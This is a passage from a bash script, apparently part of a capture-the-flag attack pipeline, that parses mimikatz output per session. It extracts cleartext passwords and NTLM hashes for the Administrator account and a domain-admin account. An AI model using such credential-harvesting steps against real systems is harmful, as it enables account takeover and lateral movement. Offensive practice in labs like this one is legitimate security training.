...
while read c; do
  ...
  rm -rf /root/Desktop/CTF/output/6-temp_mimikatz_output-final

  awk "/Session $c - IP address $ip/,/Removing portforward to Session $c/" /root/Desktop/CTF/results/*finalattack.result > /root/Desktop/CTF/output/6-temp_mimikatz_output-final
  ...
  administratorpwd=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-final | grep -v "WINDOWS02" | grep -v "WINDOWS01" | grep -i -A2 "Username : Administrator" | grep -m1  "Password" | awk -F ':' '{print $3}' | xargs | strings)
  administratorhash=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-final | grep -v "WINDOWS02" | grep -v "WINDOWS01" | grep -i -A2 "Username : Administrator" | grep -m1 "NTLM" | awk -F ':' '{print $3}' | xargs | strings)
  alanmarshalldadmpwd=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-final | grep -i -A2 "Username : alan.marshall.dadm" | grep -m1 "Password" | awk -F ':' '{print $3}' | xargs | strings)
  alanmarshalldadmhash=$(grep -v "null" /root/Desktop/CTF/output/6-temp_mimikatz_output-final | grep -i -A2 "Username : alan.marshall.dadm" | grep -m1 "NTLM" | awk -F ':' '{print $3}' | xargs | strings)
